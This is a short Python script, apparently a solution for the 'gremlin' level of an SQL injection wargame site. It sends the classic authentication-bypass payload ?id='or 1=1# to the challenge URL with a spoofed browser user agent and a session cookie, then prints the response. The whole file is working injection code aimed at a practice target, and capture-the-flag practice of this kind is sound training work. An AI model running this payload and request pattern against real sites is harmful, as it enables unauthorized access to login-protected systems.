import urllib.request

answer = ""

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"

url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"


payload = "?id='or%201=1%23"

url = url + payload

print(url+"\n\n")

req = urllib.request.Request(url);
req.add_header('User-agent', user_agent)
req.add_header("Cookie", "PHPSESSID=p75tocs5uahbs57tduoduglkjn")

res = urllib.request.urlopen(req)
data = res.read().decode('utf-8')

print(data)


